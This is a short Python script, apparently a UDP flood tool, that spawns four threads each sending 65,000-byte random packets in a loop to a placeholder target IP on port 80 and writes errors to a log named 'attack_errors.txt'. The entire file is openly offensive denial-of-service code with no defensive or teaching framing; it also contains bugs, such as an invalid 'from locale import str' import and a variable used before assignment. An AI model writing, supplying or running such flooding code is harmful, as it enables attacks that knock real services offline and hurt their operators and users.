#!/usr/local/bin/python3
import random
import socket
import threading
from locale import str

ip = "ENTER IP"
port = 80
choice = "UDP"
times = 5
threads = 4
file_txt = open("attack_errors.txt", 'a')


def floodUDP():
    data = random._urandom(65000)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            address = (ip, port)
            for x in range(times):
                s.sendto(data, address)
                if j == True:
                    file_txt.writelines("Sent packets.\n")
                    j = False
        except Exception as e:
            file_txt.write(str(e))
            file_txt.write("\n")
            break


for y in range(threads):
    if(choice == "UDP"):
        th = threading.Thread(target=floodUDP)
        th.start()
    else:
        print("Wrong input given")
